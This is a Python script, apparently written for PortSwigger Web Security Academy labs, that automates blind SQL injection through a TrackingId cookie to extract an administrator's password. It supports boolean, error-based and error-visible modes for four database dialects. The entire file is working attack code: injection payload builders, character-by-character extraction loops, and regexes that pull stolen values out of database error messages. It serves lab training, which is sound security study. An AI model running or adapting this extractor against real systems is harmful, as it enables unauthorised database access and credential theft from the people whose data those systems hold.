#!/usr/bin/env python3
"""
Blind SQL Injection - Multi-mode password extractor
PortSwigger Web Security Academy Labs

Modes:
  boolean       — iterative, oracle = "Welcome back" in body
  error         — iterative, oracle = HTTP 500 vs 200
  error-visible — one-shot, full value reflected in DB error message

Databases: postgresql, mysql, oracle, mssql
"""
import argparse
import re
import sys
import requests

CHARSET = "abcdefghijklmnopqrstuvwxyz0123456789"
MAX_POSITIONS = 30
PATH = "/filter?category=Gifts"

SUBSTR_FN = {
    "postgresql": "SUBSTRING",
    "mysql":      "SUBSTRING",
    "mssql":      "SUBSTRING",
    "oracle":     "SUBSTR",
}

# Default regex patterns to parse the plaintext value out of DB error messages.
# Override with --parse-error if the app formats the message differently.
DEFAULT_PARSE_PATTERNS = {
    "postgresql": r'integer: "(.+?)"',       # invalid input syntax for type integer: "abc123"
    "mysql":      r"~(.+)",                  # XPATH syntax error: '~abc123'
    "oracle":     r'invalid number "(.+?)"', # ORA-01722: invalid number "abc123"
    "mssql":      r"value '(.+?)'",          # Conversion failed when converting the nvarchar value 'abc123'
}


# ---------------------------------------------------------------------------
# Payload builders
# ---------------------------------------------------------------------------

def _user_clause(db: str, username: str, offset: int | None) -> str:
    """
    Build the WHERE / rownum / LIMIT clause used to target a specific user row.

    If --user-offset is given, ignore the username filter and use positional
    row selection instead (useful when the full WHERE clause makes the cookie
    too long to fit in the request).
    """
    if offset is not None:
        if db == "oracle":
            return f"WHERE rownum={offset + 1}"
        elif db == "mssql":
            return ""  # TOP 1 is baked into MSSQL payloads; offset not supported
        else:
            return f"LIMIT 1 OFFSET {offset}"
    else:
        clause = f"WHERE username='{username}'"
        if db == "oracle":
            clause += " AND rownum=1"
        return clause


def build_iterative_payload(
    mode: str, db: str,
    tracking_id: str, session: str,
    position: int, char: str,
    username: str, offset: int | None,
) -> str:
    fn = SUBSTR_FN[db]
    uc = _user_clause(db, username, offset)

    if mode == "boolean":
        sqli = f"' AND {fn}((SELECT password FROM users {uc}),{position},1)='{char}'--"
    else:  # error
        sqli = (
            f"'||(SELECT CASE WHEN ({fn}(password,{position},1)='{char}') "
            f"THEN TO_CHAR(1/0) ELSE '' END FROM users {uc})--"
        )

    return f"TrackingId={tracking_id}{sqli}; session={session}"


def _visible_row_clause(db: str, username: str, offset: int | None) -> str:
    """
    Row selector for error-visible payloads.

    Defaults to LIMIT / rownum (no embedded string literals) because
    WHERE username='...' embeds single quotes that some cookie parsers
    truncate on, cutting the payload short before it reaches the DB.

    Pass --user-offset to select a specific row, or override with
    --username-filter only when you know the cookie parser is safe.
    """
    if offset is not None:
        if db == "oracle":
            return f"WHERE rownum={offset + 1}"
        elif db == "mssql":
            return f"WHERE username='{username}'"  # MSSQL has no LIMIT
        else:
            return f"LIMIT 1 OFFSET {offset}"
    else:
        if db == "oracle":
            return "WHERE rownum=1"
        elif db == "mssql":
            return f"WHERE username='{username}'"
        else:
            return "LIMIT 1"  # avoids embedded string literal


def build_visible_payload(
    db: str,
    tracking_id: str, session: str,
    username: str, offset: int | None,
) -> str:
    uc = _visible_row_clause(db, username, offset)

    if db == "postgresql":
        sqli = f"'||(SELECT CAST(password AS int) FROM users {uc})--"
    elif db == "mysql":
        sqli = f"' AND extractvalue(1,concat(0x7e,(SELECT password FROM users {uc})))--"
    elif db == "oracle":
        sqli = f"'||(SELECT TO_NUMBER(password) FROM users {uc})--"
    else:  # mssql
        sqli = f"'+(SELECT CONVERT(int,password) FROM users {uc})--"

    return f"TrackingId={tracking_id}{sqli}; session={session}"


# ---------------------------------------------------------------------------
# Extraction logic
# ---------------------------------------------------------------------------

def is_true_iterative(mode: str, r: requests.Response) -> bool:
    if mode == "boolean":
        return "Welcome back" in r.text
    return r.status_code == 500


def extract_iterative(
    target: str, session: str, tracking_id: str,
    mode: str, db: str, username: str, offset: int | None,
) -> str:
    password = ""
    for position in range(1, MAX_POSITIONS + 1):
        found = False
        for char in CHARSET:
            cookie = build_iterative_payload(
                mode, db, tracking_id, session, position, char, username, offset
            )
            r = requests.get(target, headers={"Cookie": cookie}, timeout=10)
            if is_true_iterative(mode, r):
                password += char
                print(f"  Position {position:02d}: {char}  →  {password}")
                found = True
                break

        if not found:
            print(f"\n[*] No match at position {position} — extraction complete.")
            break

    return password


def extract_visible(
    target: str, session: str, tracking_id: str,
    db: str, username: str, offset: int | None,
    parse_pattern: str, verbose: bool,
) -> str:
    cookie = build_visible_payload(db, tracking_id, session, username, offset)
    r = requests.get(target, headers={"Cookie": cookie}, timeout=10)

    if verbose:
        print(f"\n[~] Raw response ({r.status_code}):")
        print(r.text)
        print()

    match = re.search(parse_pattern, r.text)
    if match:
        return match.group(1)

    print(f"[!] Parse pattern {parse_pattern!r} did not match.")
    print(f"    Use --parse-error to supply a custom regex, or --verbose to inspect the raw output.")
    return ""


# ---------------------------------------------------------------------------
# Entry point
# ---------------------------------------------------------------------------

def main():
    parser = argparse.ArgumentParser(
        description="Blind SQLi extractor — boolean, error, and error-visible modes (PortSwigger labs)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
examples:
  # Boolean oracle, PostgreSQL (default)
  python3 scripts/10_blind_sqli.py --url https://LAB.web-security-academy.net/ \\
    --session <val> --tracking-id <val>

  # Error-blind oracle, Oracle DB
  python3 scripts/10_blind_sqli.py --url https://LAB.web-security-academy.net/ \\
    --session <val> --tracking-id <val> --mode error --db oracle

  # Error-visible one-shot, PostgreSQL
  python3 scripts/10_blind_sqli.py --url https://LAB.web-security-academy.net/ \\
    --session <val> --tracking-id <val> --mode error-visible --verbose

  # Error-visible, enumerate by row offset instead of username
  python3 scripts/10_blind_sqli.py --url https://LAB.web-security-academy.net/ \\
    --session <val> --tracking-id <val> --mode error-visible --user-offset 0
""",
    )
    parser.add_argument("--url", required=True,
                        help="Lab base URL, e.g. https://LABID.web-security-academy.net/")
    parser.add_argument("--session", required=True,
                        help="session cookie value from browser DevTools")
    parser.add_argument("--tracking-id", required=True,
                        help="TrackingId cookie value from browser DevTools")
    parser.add_argument("--mode",
                        choices=["boolean", "error", "error-visible"],
                        default="boolean",
                        help="boolean=Welcome back oracle | error=HTTP 500 oracle | error-visible=value in DB error")
    parser.add_argument("--db", choices=list(SUBSTR_FN.keys()), default="postgresql",
                        help="Database dialect (default: postgresql)")
    parser.add_argument("--username-filter", default="administrator", metavar="USERNAME",
                        help="Target username for WHERE clause (default: administrator)")
    parser.add_argument("--user-offset", type=int, default=None, metavar="N",
                        help="Use LIMIT 1 OFFSET N instead of a WHERE username clause (0 = first row). "
                             "Use when the full WHERE clause makes the cookie too long.")
    parser.add_argument("--parse-error", default=None, metavar="REGEX",
                        help="Regex to extract the value from the DB error response (error-visible only). "
                             "Defaults: postgresql='integer: \"(.+?)\"'  mysql='~(.+)'  "
                             "oracle='invalid number \"(.+?)\"'  mssql=\"value '(.+?)'\"")
    parser.add_argument("--verbose", action="store_true",
                        help="Print raw response body (error-visible mode) to help tune --parse-error")
    args = parser.parse_args()

    target = args.url.rstrip("/") + PATH
    print(f"[*] Target : {target}")
    print(f"[*] Mode   : {args.mode}")
    print(f"[*] DB     : {args.db}")
    if args.user_offset is not None:
        print(f"[*] Filter : LIMIT 1 OFFSET {args.user_offset}")
    else:
        print(f"[*] Filter : username='{args.username_filter}'")

    if args.mode == "error-visible":
        pattern = args.parse_error or DEFAULT_PARSE_PATTERNS[args.db]
        print(f"[*] Pattern: {pattern}\n")
        password = extract_visible(
            target, args.session, args.tracking_id,
            args.db, args.username_filter, args.user_offset,
            pattern, args.verbose,
        )
    else:
        print(f"[*] Max len: {MAX_POSITIONS} chars\n")
        password = extract_iterative(
            target, args.session, args.tracking_id,
            args.mode, args.db, args.username_filter, args.user_offset,
        )

    if password:
        print(f"\n[+] Password: {password}")
    else:
        print("\n[-] No password recovered.")
        sys.exit(1)


if __name__ == "__main__":
    main()
